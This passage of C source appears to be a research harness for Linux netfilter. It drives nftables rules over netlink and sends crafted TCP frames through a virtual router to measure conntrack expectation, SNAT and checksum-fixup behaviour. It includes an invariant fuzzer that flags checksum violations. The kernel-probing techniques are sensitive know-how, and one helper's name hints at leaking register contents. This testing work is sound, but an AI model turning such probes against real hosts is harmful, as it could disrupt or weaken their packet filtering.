	f543_tcp_out(&os0, &or0);
	f539_devstat("fv0", &dv0);
	f539_devstat("lo", &dl0);
	if (a->payid != F542_PAY_NONE) {
		char req[96];
		int payid = a->payid;

		s0 = 0x20000001U;	/* cid 0: 0x20000000 + 1 */
		p1 = f543_payload(payid, w0, rx, (int)sizeof(rx));
		snprintf(req, sizeof(req), "N2 0 %d %d %d %02x%02x%02x%02x\n",
			 a->segdoff, a->segflags, payid,
			 w0[0], w0[1], w0[2], w0[3]);
		if (f539_write_all(e.cmd, req, (int)strlen(req)) < 0) {
			snprintf(out, n, "setup=PEER_WRITE_FAIL");
			goto done;
		}
		if (f539_read_line(e.ack, line, sizeof(line), 20000) < 0 ||
		    line[0] != 'D') {
			snprintf(out, n, "setup=DATA_REPLY_FAIL|%s", line);
			goto done;
		}
		snprintf(frames1, sizeof(frames1), "%s", line + 1);
		f543_frames(line + 1, &nack, &rack, &rflags, sport);
		memset(rx, 0, sizeof(rx));
		if (cfd >= 0) {
			struct pollfd pfd;
			int waited = 0;

			pfd.fd = cfd;
			pfd.events = POLLIN;
			while (waited < 900 && rxlen < F543_DUMP) {
				ssize_t r;

				if (poll(&pfd, 1, 50) <= 0) {
					waited += 50;
					continue;
				}
				r = recv(cfd, rx + rxlen, sizeof(rx) - (size_t)rxlen,
					 MSG_DONTWAIT);
				if (r > 0)
					rxlen += (int)r;
				else
					break;
				waited += 50;
			}
		}
	}
	f541_ct_invalid(&iv1);
	f542_ct_stat("invalid", &ivd1);
	f542_ct_stat("drop", &dr1);
	f541_tcp_snmp(&is1, &ie1, &cs1);
	f543_tcp_out(&os1, &or1);
	f539_devstat("fv0", &dv1);
	f539_devstat("lo", &dl1);
	f542_ct_lines(sport, &ctlines, &cthelper);
	f543_ct_line(sport, ctline, sizeof(ctline));
	if (cfd >= 0) {
		socklen_t sl = sizeof(soerr);

		getsockopt(cfd, SOL_SOCKET, SO_ERROR, &soerr, &sl);
	}

	{
		char needle[40];
		int k;

		snprintf(needle, sizeof(needle), "TCP 10.9.0.1:%d;", a->snport);
		for (k = 0; k + (int)strlen(needle) <= rxlen; k++) {
			if (!memcmp(rx + k, needle, strlen(needle))) {
				urioff = k;
				break;
			}
		}
	}

	/* the second segment: the table -- and with it the door -- is gone, so
	 * what the box does to this packet is only seqadj, and what it says
	 * about the client's numbering is the measurement */
	if (a->second) {
		nops = 0;
		nrecs = 0;
		op_delrule_flush543(tab, "c");
		errs = nf_flush();
		{
			int nr = 0, dv = 0, da = 0;
			uint32_t db = 0, dof = 0, dl = 0, dg = 0;

			f543_dump(tab, "c", &nr, &db, &dof, &dl, &dg, &dv, &da);
			afterflush = nr;
		}
		p2 = 4;
		if (f539_write_all(e.cmd, "N2 0 5 24 5 00000000\n",
				   (int)strlen("N2 0 5 24 5 00000000\n")) < 0) {
			snprintf(out, n, "setup=PEER_WRITE_FAIL2");
			goto done;
		}
		if (f539_read_line(e.ack, line, sizeof(line), 20000) < 0 ||
		    line[0] != 'D') {
			snprintf(out, n, "setup=DATA2_REPLY_FAIL|%s", line);
			goto done;
		}
		snprintf(frames2, sizeof(frames2), "%s", line + 1);
		f543_frames(line + 1, &nack2, &rack2, &rflags, sport);
		if (cfd >= 0) {
			struct pollfd pfd;
			int waited = 0;

			pfd.fd = cfd;
			pfd.events = POLLIN;
			while (waited < 500 && rxlen < F543_DUMP) {
				ssize_t r;

				if (poll(&pfd, 1, 50) <= 0) {
					waited += 50;
					continue;
				}
				r = recv(cfd, rx + rxlen, sizeof(rx) - (size_t)rxlen,
					 MSG_DONTWAIT);
				if (r > 0)
					rxlen += (int)r;
				else
					break;
				waited += 50;
			}
		}
		rx2 = rxlen;
	}

	off += snprintf(out + off, n - (size_t)off,
			"setup=OK|sport=%u|s0=%u|p1=%d|p2=%d|rxlen=%d|rx2=%d|"
			"nack=%d|rack=%u|rflags=%02x|nack2=%d|rack2=%u|"
			"ctinv=%llu|ctinvd=%llu|ctdrop=%llu|ctlines=%d|cthelper=%d|"
			"inseg=%llu|inerr=%llu|cserr=%llu|outseg=%llu|outrst=%llu|"
			"fv0tx=%llu|fv0rx=%llu|fv0drop=%llu|lotx=%llu|urioff=%d|"
			"w0=%02x%02x%02x%02x|hsn=%d|acc=%d|srvseq=%u|hsflags=%02x|"
			"f1=%s|f2=%s|afterflush=%d|soerr=%d|ct=%s|pay=",
			sport, s0, p1, p2, rxlen, rx2, nack, rack, rflags, nack2,
			rack2, iv1 - iv0, ivd1 - ivd0, dr1 - dr0, ctlines, cthelper,
			is1 - is0, ie1 - ie0, cs1 - cs0, os1 - os0, or1 - or0,
			dv1.tx_pkts - dv0.tx_pkts, dv1.rx_pkts - dv0.rx_pkts,
			dv1.tx_drop - dv0.tx_drop, dl1.tx_pkts - dl0.tx_pkts, urioff,
			w0[0], w0[1], w0[2],
			w0[3], hsn, acc, srv_seq, hsflags, frames1, frames2, afterflush,
			soerr, ctline);
	for (i = 0; i < rxlen && (size_t)off + 2 < n; i++)
		off += snprintf(out + off, n - (size_t)off, "%02x", rx[i]);

done:
	nops = 0;
	nrecs = 0;
	op_deltable_f540(tab);
	nf_flush();
	if (cfd >= 0)
		close(cfd);
	if (lfd >= 0)
		close(lfd);
	f539_write_all(e.cmd, "C 0\n", 4);
	f539_read_line(e.ack, line, sizeof(line), 3000);
	f539_env_close(&e);
	return 0;
}

/* ---- the arms ---- */
static int sc_f20_byhand_post(char *o, size_t n)
{
	struct f543_arm a = { "f20.byhand.post", 1, 0, F542_STORE_NONE,
			      F543_PAY_POST, 5, 0x18, 0, 0, 506, 0 };

	return f543_run(&a, o, n);
}

static int sc_f20_ctl_seq(char *o, size_t n)
{
	struct f543_arm a = { "f20.ctl.seq", 0, 1, F542_STORE_NONE,
			      F543_PAY_MSG, 5, 0x18, 0, 0, 507, 0 };

	return f543_run(&a, o, n);
}

static int sc_f20_ctl_seq2(char *o, size_t n)
{
	struct f543_arm a = { "f20.ctl.seq2", 0, 1, F542_STORE_NONE,
			      F543_PAY_MSG, 5, 0x18, 0, 0, 508, 1 };

	return f543_run(&a, o, n);
}

static int sc_f20_door_up(char *o, size_t n)
{
	struct f543_arm a = { "f20.door.up", 0, 1, F542_STORE_MSS,
			      F543_PAY_MSGPFX, 5, 0x18, 0x6018, 0x5018, 509, 1 };

	return f543_run(&a, o, n);
}

static int sc_f20_door_down(char *o, size_t n)
{
	struct f543_arm a = { "f20.door.down", 0, 1, F542_STORE_REGI,
			      F543_PAY_TAIL, 6, 0x18, 0x5018, 0x6018, 510, 1 };

	return f543_run(&a, o, n);
}

static int sc_f20_door_down_a(char *o, size_t n)
{
	struct f543_arm a = { "f20.door.down.a", 0, 1, F542_STORE_REGI,
			      F543_PAY_TAIL, 6, 0x18, 0x5018, 0x6018, 512, 0 };

	return f543_run(&a, o, n);
}

/* the control that separates "the tracker detached the packet" from "the SNAT
 * lost it": the same 6->5 door, no SNAT at all, so the Via is not translated
 * (no length change) and the only thing left is the invalid ACK itself */
static int sc_f20_door_down_nosnat(char *o, size_t n)
{
	struct f543_arm a = { "f20.door.down.nosnat", 0, 0, F542_STORE_REGI,
			      F543_PAY_TAIL, 6, 0x18, 0x5018, 0x6018, 0, 0 };

	return f543_run(&a, o, n);
}

static int sc_f20_door_down_post(char *o, size_t n)
{
	struct f543_arm a = { "f20.door.down.post", 1, 0, F542_STORE_NONE,
			      F543_PAY_POST, 5, 0x18, 0, 0, 511, 0 };

	return f543_run(&a, o, n);
}

static void run_f20(void)
{
	static struct { const char *id; int (*fn)(char *, size_t); } tab[] = {
		{ "f20.byhand.post", sc_f20_byhand_post },
		{ "f20.ctl.seq", sc_f20_ctl_seq },
		{ "f20.ctl.seq2", sc_f20_ctl_seq2 },
		{ "f20.door.up", sc_f20_door_up },
		{ "f20.door.down", sc_f20_door_down },
		{ "f20.door.down.a", sc_f20_door_down_a },
		{ "f20.door.down.nosnat", sc_f20_door_down_nosnat },
		{ "f20.door.down.post", sc_f20_door_down_post },
	};
	unsigned int i;

	for (i = 0; i < sizeof(tab) / sizeof(tab[0]); i++) {
		char out[8192];

		memset(out, 0, sizeof(out));
		tab[i].fn(out, sizeof(out));
		printf("S %s|%s\n", tab[i].id, out);
		fflush(stdout);
	}
}

/* ---------------- F21: the invariant fuzzer ---------------- */

#define NLA_HDRLEN_ 4

static void f543_fast_timeout(int fd)
{
	struct timeval tv = { 0, 20000 };

	setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
}
#define F543_PROBE_DUMP 160

#define F543_A_LIST_ELEM  1
#define F543_A_EXPR_DATA  2
#define F543_A_RULE_EXPRS 4

static unsigned int f543_rs = 0x54312345U;

static unsigned int f543_rand(void)
{
	f543_rs ^= f543_rs << 13;
	f543_rs ^= f543_rs >> 17;
	f543_rs ^= f543_rs << 5;
	return f543_rs;
}

/* I1 on one flat attribute list */
static void f543_walk_flat(const struct nlattr *a, int len, int *nviol,
			   int *nattr)
{
	while (len >= (int)sizeof(struct nlattr)) {
		int alen = (int)a->nla_len;

		(*nattr)++;
		if (alen < (int)sizeof(struct nlattr) || alen > len) {
			(*nviol)++;
			printf("F WALKFLAT|bad|alen=%d|left=%d\n", alen, len);
			return;
		}
		len -= (int)NLA_ALIGN_(alen);
		a = (const struct nlattr *)((const char *)a + NLA_ALIGN_(alen));
	}
	if (len < 0) {
		(*nviol)++;
		printf("F WALKFLAT|over|left=%d\n", len);
	}
}

/* I1 on a dump message: the same walk, but inside the three attribute types
 * that are nests.  A nesting level that does not add up is a violation. */
static void f543_walk_nest(const struct nlattr *a, int len, int level,
			   int *nviol, int *nattr)
{
	while (len >= (int)sizeof(struct nlattr)) {
		int alen = (int)a->nla_len;
		int type = (int)(a->nla_type & 0x3fff);
		int down = 0;

		(*nattr)++;
		if (alen < (int)sizeof(struct nlattr) || alen > len) {
			(*nviol)++;
			return;
		}
		/* the first three levels are fixed by the nftables schema
		 * (rule -> expressions -> elem -> expr data); below that the
		 * expression's own type numbers are namespace-local, so only
		 * the NLA_F_NESTED flag may decide (type 2 there is a u32) */
		if (level == 0 && type == 4)
			down = 1;
		else if (level == 1 && type == 1)
			down = 1;
		else if (level == 2 && type == 2)
			down = 1;
		else if (level == 3 && (a->nla_type & 0x8000) && alen > NLA_HDRLEN_)
			down = 1;
		if (down)
			f543_walk_nest((const struct nlattr *)((const char *)a + NLA_HDRLEN_),
				       alen - NLA_HDRLEN_, level + 1, nviol, nattr);
		len -= (int)NLA_ALIGN_(alen);
		a = (const struct nlattr *)((const char *)a + NLA_ALIGN_(alen));
	}
	if (len < 0)
		(*nviol)++;
}

/* one batch, with every message the kernel returns walked for I1 */
static int f543_send_checked(int *nviol, int *nattr)
{
	char batch[32768];
	char rbuf[16384];
	int len, fd, errs = 0, rl;
	struct nlmsghdr *nlh;

	len = assemble(batch, sizeof(batch));
	if (len < 0)
		return -1;
	fd = nl_open();
	if (fd < 0)
		return -2;
	f543_fast_timeout(fd);
	g_err = 0;
	g_extack[0] = 0;
	if (send(fd, batch, len, 0) != len) {
		close(fd);
		return -3;
	}
	for (;;) {
		rl = (int)recv(fd, rbuf, sizeof(rbuf), 0);
		if (rl <= 0)
			break;
		for (nlh = (struct nlmsghdr *)rbuf; NLMSG_OK(nlh, rl);
		     nlh = NLMSG_NEXT(nlh, rl)) {
			int pay = (int)nlh->nlmsg_len - (int)NLMSG_HDRLEN;

			if (pay < 0) {
				(*nviol)++;
				continue;
			}
			if (nlh->nlmsg_type == NLMSG_ERROR) {
				struct nlmsgerr *er =
					(struct nlmsgerr *)NLMSG_DATA(nlh);
				int skip = (int)sizeof(*er);
				int rest = pay - skip;


				/* nfnetlink echoes the original message after the
				 * nlmsgerr for a batch error: walk IT as a message,
				 * then whatever extack attributes follow */
				if (er->msg.nlmsg_len > NLMSG_HDRLEN &&
				    (int)er->msg.nlmsg_len - (int)NLMSG_HDRLEN <= rest) {
					/* the echoed body is the original message
					 * minus its header; it is our own bytes,
					 * only its LENGTH is the kernel's */
					skip += (int)er->msg.nlmsg_len - (int)NLMSG_HDRLEN;
					rest = pay - skip;
				}
				if (rest > 0)
					f543_walk_flat((const struct nlattr *)
						       ((char *)er + skip), rest,
						       nviol, nattr);
				if (er->error) {
					errs++;
					if (!g_err)
						g_err = er->error;
				}
			} else if (pay >= 4) {
				f543_walk_flat((const struct nlattr *)
					       ((char *)NLMSG_DATA(nlh) + 4),
					       pay - 4, nviol, nattr);
			}
		}
	}
	close(fd);
	return errs;
}

static struct nlmsghdr *op_newrule_fuzz(const char *table, const char *chain,
					uint32_t base, uint32_t off, uint32_t len,
					int csum_type, uint32_t csum_off,
					const unsigned char *imm, int immlen)
{
	struct nlmsghdr *nlh = f542_rule_begin(table, chain);
	struct nlattr *exprs = nest_start(nlh, NFTA_RULE_EXPRESSIONS, "z.exprs");
	struct nlattr *e, *d;

	exfil_imm_value(nlh, NFT_REG32_00, imm, immlen);
	e = nest_start(nlh, NFTA_LIST_ELEM, "z.elem");
	put_str(nlh, NFTA_EXPR_NAME, "payload", "z.name");
	d = nest_start(nlh, NFTA_EXPR_DATA, "z.data");
	put_be32(nlh, NFTA_PAYLOAD_SREG, NFT_REG32_00, "z.sreg");
	put_be32(nlh, NFTA_PAYLOAD_BASE, base, "z.base");
	put_be32(nlh, NFTA_PAYLOAD_OFFSET, off, "z.offset");
	put_be32(nlh, NFTA_PAYLOAD_LEN, len, "z.len");
	put_be32(nlh, NFTA_PAYLOAD_CSUM_TYPE, (uint32_t)csum_type, "z.csum_type");
	put_be32(nlh, NFTA_PAYLOAD_CSUM_OFFSET, csum_off, "z.csum_off");
	nest_end(nlh, d);
	nest_end(nlh, e);
	nest_end(nlh, exprs);
	nops++;
	return nlh;
}

/* GETRULE dump: I1 over every message, I5 from the payload expression */
static int f543_dump(const char *table, const char *chain, int *nrules,
		     uint32_t *f_base, uint32_t *f_off, uint32_t *f_len,
		     uint32_t *f_dreg, int *nviol, int *nattr)
{
	char batch[4096];
	char rbuf[16384];
	struct nlmsghdr *nlh;
	int len, fd, rl, done = 0, err = 0;

	*nrules = 0;
	*f_base = *f_off = *f_len = *f_dreg = 0xdeadbeefU;
	cur_op = 0;
	nlh = msg_start(batch, (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_GETRULE,
			NLM_F_REQUEST | NLM_F_DUMP, NFPROTO_IPV4);
	put_str(nlh, NFTA_RULE_TABLE, table, "z.d.table");
	put_str(nlh, NFTA_RULE_CHAIN, chain, "z.d.chain");
	len = (int)nlh->nlmsg_len;
	fd = nl_open();
	if (fd < 0)
		return -2;
	f543_fast_timeout(fd);
	if (send(fd, batch, len, 0) != len) {
		close(fd);
		return -3;
	}
	while (!done) {
		rl = (int)recv(fd, rbuf, sizeof(rbuf), 0);
		if (rl <= 0)
			break;
		for (nlh = (struct nlmsghdr *)rbuf; NLMSG_OK(nlh, rl);
		     nlh = NLMSG_NEXT(nlh, rl)) {
			int pay = (int)nlh->nlmsg_len - (int)NLMSG_HDRLEN;

			if (nlh->nlmsg_type == NLMSG_DONE) {
				done = 1;
				break;
			}
			if (nlh->nlmsg_type == NLMSG_ERROR) {
				struct nlmsgerr *er =
					(struct nlmsgerr *)NLMSG_DATA(nlh);

				err = er->error;
				done = 1;
				break;
			}
			if (pay < 4) {
				(*nviol)++;
				continue;
			}
			f543_walk_nest((const struct nlattr *)
				       ((char *)NLMSG_DATA(nlh) + 4), pay - 4, 0,
				       nviol, nattr);
			(*nrules)++;
			{
				/* NFTA_RULE_EXPRESSIONS -> elems -> {name, data} */
				const struct nlattr *a;
				int left = pay - 4;
				const struct nlattr *exprs = NULL;

				a = (const struct nlattr *)((char *)NLMSG_DATA(nlh) + 4);
				while (left >= (int)sizeof(struct nlattr) &&
				       a->nla_len >= 4 && (int)a->nla_len <= left) {
					if ((a->nla_type & 0x3fff) == F543_A_RULE_EXPRS)
						exprs = a;
					left -= (int)NLA_ALIGN_(a->nla_len);
					a = (const struct nlattr *)((const char *)a +
						NLA_ALIGN_(a->nla_len));
				}
				if (exprs) {
					const struct nlattr *el;
					int elen = (int)exprs->nla_len - NLA_HDRLEN_;

					el = (const struct nlattr *)((const char *)exprs +
								     NLA_HDRLEN_);
					while (elen >= (int)sizeof(struct nlattr) &&
					       el->nla_len >= 4 &&
					       (int)el->nla_len <= elen) {
						const struct nlattr *inner;
						int ilen, is_payload = 0;
						const struct nlattr *data = NULL;

						inner = (const struct nlattr *)
							((const char *)el + NLA_HDRLEN_);
						ilen = (int)el->nla_len - NLA_HDRLEN_;
						while (ilen >= (int)sizeof(struct nlattr) &&
						       inner->nla_len >= 4 &&
						       (int)inner->nla_len <= ilen) {
							int it = (int)(inner->nla_type & 0x3fff);

							if (it == NFTA_EXPR_NAME &&
							    !strcmp((const char *)inner + NLA_HDRLEN_,
								    "payload"))
								is_payload = 1;
							if (it == F543_A_EXPR_DATA)
								data = inner;
							ilen -= (int)NLA_ALIGN_(inner->nla_len);
							inner = (const struct nlattr *)
								((const char *)inner +
								 NLA_ALIGN_(inner->nla_len));
						}
						if (is_payload && data &&
						    *f_base == 0xdeadbeefU) {
							const struct nlattr *q;
							int qlen = (int)data->nla_len - NLA_HDRLEN_;

							q = (const struct nlattr *)
								((const char *)data + NLA_HDRLEN_);
							while (qlen >= (int)sizeof(struct nlattr) &&
							       q->nla_len >= 4 &&
							       (int)q->nla_len <= qlen) {
								uint32_t v;
								int qt = (int)(q->nla_type & 0x3fff);

								memcpy(&v, (const char *)q + NLA_HDRLEN_, 4);
								v = ntohl(v);
								if (qt == NFTA_PAYLOAD_BASE)
									*f_base = v;
								else if (qt == NFTA_PAYLOAD_OFFSET)
									*f_off = v;
								else if (qt == NFTA_PAYLOAD_LEN)
									*f_len = v;
								else if (qt == NFTA_PAYLOAD_DREG)
									*f_dreg = v;
								qlen -= (int)NLA_ALIGN_(q->nla_len);
								q = (const struct nlattr *)
									((const char *)q +
									 NLA_ALIGN_(q->nla_len));
							}
						}
						elen -= (int)NLA_ALIGN_(el->nla_len);
						el = (const struct nlattr *)
							((const char *)el + NLA_ALIGN_(el->nla_len));
					}
				}
			}
		}
	}
	close(fd);
	return err ? -4 : 0;
}

/* The baseline the captured datagram is compared against: the frame the peer
 * builds (f541_peer_tcp2, i = 0, optset = 0, csummode = 0) AFTER the router's
 * own transformation -- ip_forward() runs ip_decrease_ttl() before the FORWARD
 * hook, so ttl 64 -> 63 and the IP checksum is recomputed.  Anything else that
 * differs is the rule's doing. */
static int f543_expect(unsigned char *ip, int plen, int doff, int flags)
{
	unsigned char *tcp = ip + 20;
	unsigned char *pay = tcp + 20;
	unsigned char pseudo[12];
	unsigned int sum;
	uint32_t saddr = htonl(F539_ADDR_PEER), daddr = htonl(F539_ADDR_DST);
	int k;

	memset(ip, 0, (size_t)(40 + plen));
	ip[0] = 0x45;
	ip[2] = (unsigned char)((20 + 20 + plen) >> 8);
	ip[3] = (unsigned char)((20 + 20 + plen) & 0xff);
	ip[5] = 0x50;
	ip[8] = 63;			/* after ip_decrease_ttl() */
	ip[9] = IPPROTO_TCP;
	memcpy(ip + 12, &saddr, 4);
	memcpy(ip + 16, &daddr, 4);
	*(unsigned short *)(ip + 10) = htons(f539_csum(ip, 20));
	tcp[0] = 0x9c;
	tcp[1] = 0x40;
	tcp[2] = (unsigned char)(F539_PORT >> 8);
	tcp[3] = (unsigned char)(F539_PORT & 0xff);
	tcp[4] = 0x11;
	tcp[5] = 0x22;
	tcp[6] = 0x33;
	tcp[7] = 0x44;
	tcp[12] = (unsigned char)doff;
	tcp[13] = (unsigned char)flags;
	tcp[14] = 0xff;
	tcp[15] = 0xff;
	for (k = 0; k < plen; k++)
		pay[k] = 0x77;
	memcpy(pseudo, ip + 12, 8);
	pseudo[8] = 0;
	pseudo[9] = IPPROTO_TCP;
	pseudo[10] = (unsigned char)((20 + plen) >> 8);
	pseudo[11] = (unsigned char)((20 + plen) & 0xff);
	sum = f541_csum16(pseudo, 12, 0);
	sum = f541_csum16(tcp, 20 + plen, sum);
	*(unsigned short *)(tcp + 16) = htons((unsigned short)(~sum & 0xffff));
	return 40 + plen;
}

/* peer side: one frame in, the forwarded IP datagram out (the box rewrites the
 * MAC header, so the datagram is the comparable part), short polls so that
 * thousands of iterations fit in one boot */
static int f543_peer_probe(int plen, int doff, int flags, int *nsent, int *ncap,
			   unsigned char *fr, int *frlen)
{
	struct sockaddr_ll sll;
	struct pollfd pfd;
	unsigned char *f, buf[2048];
	int s, i, idx = f539_ifindex("fv1");
	int flen = 14 + 20 + 20 + plen;

	*nsent = 0;
	*ncap = 0;
	*frlen = 0;
	if (idx < 0 || plen < 0 || plen > 600)
		return -1;
	s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	if (s < 0)
		return -2;
	f = calloc(1, (size_t)flen);
	if (!f) {
		close(s);
		return -3;
	}
	memset(&sll, 0, sizeof(sll));
	sll.sll_family = AF_PACKET;
	sll.sll_protocol = htons(ETH_P_IP);
	sll.sll_ifindex = idx;
	sll.sll_halen = 6;
	memcpy(sll.sll_addr, f539_mac_me, 6);
	while (recv(s, buf, sizeof(buf), MSG_DONTWAIT) > 0)
		;
	{
		unsigned char *ip = f + 14;

		f543_expect(ip, plen, doff, flags);
		ip[8] = 64;			/* the wire: the box does the ttl */
		memset(ip + 10, 0, 2);
		*(unsigned short *)(ip + 10) = htons(f539_csum(ip, 20));
	}
	memcpy(f, f539_mac_me, 6);
	memcpy(f + 6, f539_mac_far, 6);
	f[12] = 0x08;
	f[13] = 0x00;
	if (sendto(s, f, (size_t)flen, 0, (struct sockaddr *)&sll, sizeof(sll)) >= 0)
		(*nsent)++;
	pfd.fd = s;
	pfd.events = POLLIN;
	for (i = 0; i < 40; i++) {
		struct sockaddr_ll from;
		socklen_t fl = sizeof(from);
		ssize_t r;

		if (*ncap > 0)
			break;
		if (poll(&pfd, 1, 10) <= 0)
			continue;
		r = recvfrom(s, buf, sizeof(buf), MSG_DONTWAIT,
			     (struct sockaddr *)&from, &fl);
		if (r < 40)
			continue;
		if (from.sll_pkttype == PACKET_OUTGOING)
			continue;
		if (buf[12] != 0x08 || buf[13] != 0x00)
			continue;
		if (buf[14 + 9] != IPPROTO_TCP)
			continue;
		/* F28: identify the probe by its addresses, not its port: one arm
		 * rewrites the destination port and must still be counted. */
		if (buf[14 + 16] != 0x0a || buf[14 + 17] != 0x08 ||
		    buf[14 + 18] != 0x00 || buf[14 + 19] != 0x05)
			continue;
		if (*ncap == 0) {
			int nb = (int)r - 14;

			if (nb > F543_PROBE_DUMP)
				nb = F543_PROBE_DUMP;
			memcpy(fr, buf + 14, (size_t)nb);
			*frlen = nb;
		}
		(*ncap)++;
	}
	free(f);
	close(s);
	return 0;
}


/* the IPv4 header's own checksum over a captured datagram: 0 valid, 1 not */
static int f543_ip_csum_ok(const unsigned char *ip, int cap)
{
	int ihl = (int)(ip[0] & 0x0f) * 4;
	unsigned int sum;

	if (ihl < 20 || ihl > cap)
		return -1;
	sum = f541_csum16(ip, ihl, 0);
	return sum == 0xffffU ? 0 : 1;
}

/* the TCP checksum over a captured IPv4 datagram: 0 valid, 1 invalid, -1 junk */

/* The fixup the kernel promises: the 2-byte word at base_offset+csum_offset
 * becomes fold( ~O - fsum + tsum ), O = the word before, fsum = the checksum
 * over the bytes the store replaces, tsum = the checksum over the store. */
static unsigned int f543_replace_word(unsigned int O, const unsigned char *oldb,
				      int oldlen, const unsigned char *newb,
				      int newlen, int odd)
{
	unsigned int f = f542_csum_partial(oldb, oldlen);
	unsigned int t = f542_csum_partial(newb, newlen);
	unsigned int tmp;

	/* g_fix548: the F26 correction -- at an odd offset the kernel's two
	 * sums are paired one byte off the header's grid, so the delta has to
	 * be rotated onto it.  Rotating on the unfolded wsum is exact: the
	 * rotation is multiplication by 256 in Z/(2^16-1). */
	if (g_fix548 && odd) {
		f = f548_ror32(f, 8);
		t = f548_ror32(t, 8);
	}
	tmp = f542_csum_add((~O) & 0xffffffffU, (~f) & 0xffffffffU);
	return f542_csum_fold(f542_csum_add(tmp, t));
}

static int f543_tcp_csum_ok(const unsigned char *ip, int iplen_cap)
{
	int ihl = (int)(ip[0] & 0x0f) * 4;
	int iplen = (int)(((unsigned int)ip[2] << 8) | ip[3]);
	unsigned char pseudo[12];
	unsigned int sum;

	if (ihl < 20 || iplen > iplen_cap || iplen < ihl + 20)
		return -1;
	if (ip[9] != IPPROTO_TCP)
		return -1;
	memcpy(pseudo, ip + 12, 8);
	pseudo[8] = 0;
	pseudo[9] = IPPROTO_TCP;
	pseudo[10] = (unsigned char)((iplen - ihl) >> 8);
	pseudo[11] = (unsigned char)((iplen - ihl) & 0xff);
	sum = f541_csum16(pseudo, 12, 0);
	sum = f541_csum16(ip + ihl, iplen - ihl, sum);
	return sum == 0xffffU ? 0 : 1;
}

/* parent side: ask the peer for one probe and decode its answer */
static int f543_probe_request(struct f539_env *e, int plen, int doff, int flags,
			      int *nsent, int *ncap, unsigned char *fr, int *flen)
{
	char req[64], line[1024], hex[2 * F543_PROBE_DUMP + 1];
	int i, rc;
	unsigned int ns = 0, nc = 0, fl = 0;

	snprintf(req, sizeof(req), "Z %d %d %d\n", plen, doff, flags);
	if (f539_write_all(e->cmd, req, (int)strlen(req)) < 0)
		return -1;
	if (f539_read_line(e->ack, line, sizeof(line), 8000) < 0)
		return -2;
	memset(hex, 0, sizeof(hex));
	if (sscanf(line + 1, "%d %u %u %400s", &rc, &ns, &nc, hex) < 3)
		return -3;
	*nsent = (int)rc;
	*ncap = (int)ns;
	(void)fl;
	*flen = 0;
	for (i = 0; i < F543_PROBE_DUMP && hex[2 * i] && hex[2 * i + 1]; i++) {
		unsigned int b = 0;

		sscanf(hex + 2 * i, "%2x", &b);
		fr[i] = (unsigned char)b;
		*flen = i + 1;
	}
	return 0;
}

static struct f539_env *f543_envp;

static int f543_case(const char *table, const char *chain, uint32_t base,
		     uint32_t off, uint32_t len, uint32_t csum_off,
		     const char *tag, int *viol, int *nattr)
{
	unsigned char imm[16];
	unsigned char cap[2048], exp[2048];
	int k, errs, nsent = 0, ncap = 0, flen = 0, rc;
	int elen, cs, changed = 0, start = -1, cpos = -1, applied = 0;

	for (k = 0; k < 16; k++)
		imm[k] = (unsigned char)(0xa0 + k);
	nops = 0;
	nrecs = 0;
	op_newrule_fuzz(table, chain, base, off, len, 1, csum_off, imm, 16);
	errs = f543_send_checked(nattr, nattr);
	if (errs != 0) {
		printf("A %s|setup=ERR|errno=%d\n", tag, g_err ? -g_err : 0);
		return 0;
	}
	memset(cap, 0, sizeof(cap));
	rc = f543_probe_request(f543_envp, 16, 0x50, 0x18, &nsent, &ncap, cap, &flen);
	if (rc < 0 || nsent != 1 || ncap != 1) {
		printf("A %s|setup=PROBE%d|sent=%d|cap=%d\n", tag, rc, nsent, ncap);
		nops = 0;
		nrecs = 0;
		op_delrule_flush543(table, chain);
		f543_send_checked(nattr, nattr);
		return 0;
	}
	elen = f543_expect(exp, 16, 0x50, 0x18);
	changed = memcmp(exp, cap, (size_t)elen) != 0;
	if (base == 2) {
		start = 20 + (int)off;
		cpos = 20 + (int)csum_off;
	} else if (base == 3) {
		start = 40 + (int)off;
		cpos = 40 + (int)csum_off;
	} else {
		start = (int)off;
		cpos = (int)csum_off;
	}
	applied = (start >= 0 && start + (int)len <= elen &&
		   !memcmp(cap + start, imm, len));
	if (base == 1 && csum_off == 10)
		cs = f543_ip_csum_ok(cap, flen);
	else
		cs = f543_tcp_csum_ok(cap, flen);
	printf("A %s|base=%u|off=%u|len=%u|coff=%u|start=%d|applied=%d|changed=%d|csum=%d|ck=%02x%02x%s\n",
	       tag, base, off, len, csum_off, start, applied, changed, cs,
	       (cpos >= 0 && cpos + 1 < flen) ? cap[cpos] : 0,
	       (cpos >= 0 && cpos + 1 < flen) ? cap[cpos + 1] : 0,
	       (applied && cs != 0) ? "|VIOLATION" : "");
	if (applied && cs != 0)
		(*viol)++;
	nops = 0;
	nrecs = 0;
	op_delrule_flush543(table, chain);
	f543_send_checked(nattr, nattr);
	return 0;
}

static void run_fuzz543(int iters)
{
	struct f539_env e;
	char tab[32], out[512];
	unsigned char imm[16], exp[2048], cap[2048];
	int i, errs, acc = 0, rej = 0, probe = 0, fwd = 0, changed = 0;
	int same = 0, viol = 0, nattr = 0, dumps = 0, dump_err = 0, nlink = 0;
	int e_einval = 0, e_range = 0, e_other = 0, skip = 0, bad_bytes = 0;
	int forw_miss = 0;
	int plen = 16, doff = 0x50, flags = 0x18;
	time_t t0 = time(NULL);

	if (f539_env_open(&e, out, sizeof(out)) < 0) {
		printf("F FUZZSETUP|fail\n");
		f539_env_close(&e);
		return;
	}
	f539_route_add("fv0", F539_NET_FAR, 24, 0);
	f539_sysctl("/proc/sys/net/netfilter/nf_conntrack_checksum", "0");
	snprintf(tab, sizeof(tab), "z543_%d", (int)getpid());
	nops = 0;
	nrecs = 0;
	op_newtable(tab);
	op_newchain(tab, "c", NF_INET_FORWARD, 0, NF_ACCEPT);
	errs = f543_send_checked(&viol, &nattr);
	if (errs != 0) {
		printf("F FUZZSETUP|errs=%d|errno=%d|extack=%s\n", errs,
		       g_err ? -g_err : 0, g_extack[0] ? g_extack : "none");
		f539_env_close(&e);
		return;
	}

	f543_envp = &e;
	f543_case(tab, "c", 2, 19, 1, 16, "odd.off.odd.len", &viol, &nattr);
	f543_case(tab, "c", 2, 18, 1, 16, "even.off.odd.len", &viol, &nattr);
	f543_case(tab, "c", 2, 19, 2, 16, "odd.off.even.len", &viol, &nattr);
	f543_case(tab, "c", 2, 18, 2, 16, "even.off.even.len", &viol, &nattr);
	f543_case(tab, "c", 2, 21, 1, 16, "odd.off2.odd.len", &viol, &nattr);
